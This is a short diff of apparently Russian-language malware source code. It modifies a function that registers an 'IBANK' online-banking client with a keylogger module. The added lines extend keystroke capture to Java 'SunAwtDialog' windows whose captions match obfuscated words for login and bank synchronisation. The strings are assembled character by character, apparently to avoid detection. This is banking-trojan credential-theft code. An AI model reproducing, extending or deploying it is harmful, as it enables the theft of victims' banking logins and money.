@@ -659,7 +659,9 @@ void RegisterIBankSystem(DWORD hashApp)
 	// Функция регистрирует систему IBANK
 
 	char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
-	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
+	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};
+	char ClassName2[] = {'S','u','n','A','w','t','D','i','a','l','o','g', 0};
+
 	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
 	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
 	char Caption3[]  = {'*','и','н','х','р','о','н','*','з','а','ц','*', 0}; //Синхронизация с банком
@@ -710,6 +712,7 @@ void RegisterIBankSystem(DWORD hashApp)
 		{ 
 			F->CaseSensetive = false;
 			F->DontSaveMouseLog = true;
+			KeyLogger::AddFilterText(F, ClassName2, Caption1);
 			KeyLogger::AddFilterText(F, ClassName, Caption2);
 			KeyLogger::AddFilterText(F, ClassName, Caption3);
 			KeyLogger::AddFilterText(F, ClassName, Caption4);
